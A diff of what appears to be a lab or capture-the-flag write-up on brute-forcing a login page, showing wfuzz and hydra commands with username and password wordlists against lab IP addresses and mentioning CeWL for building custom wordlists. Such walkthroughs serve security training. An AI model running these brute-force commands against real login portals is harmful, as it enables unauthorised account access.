@@ -28,7 +28,8 @@ Customising Commands
 
 ## Brute-force the login portal using **_wfuzz_**
 ```
-wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.132.80/login.php -d "username=FUZZ&password=FUZ2Z"
+wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.132.80/login.php
+-d "username=FUZZ&password=FUZ2Z"
 ```
 
 In the command above:<br>
@@ -58,7 +59,7 @@ hydra -L usernames.txt -P passwords.txt http-post-form://10.10.106.165/login.php
 :"Please enter the correct credentials"
 ```
 
-### Can also use **_Turbo Intruder_**
+### Turbo Intruder
 
 ### Conclusion
 AntarctiCrafts' unexpected breach highlighted the power of specialised brute-force attacks. The swift and successful unauthorised access suggests the attacker likely employed a unique, context-specific wordlist, possibly curated using tools like CeWL. This tool can scan a company's public content to create a wordlist enriched with unique jargon and terminologies.
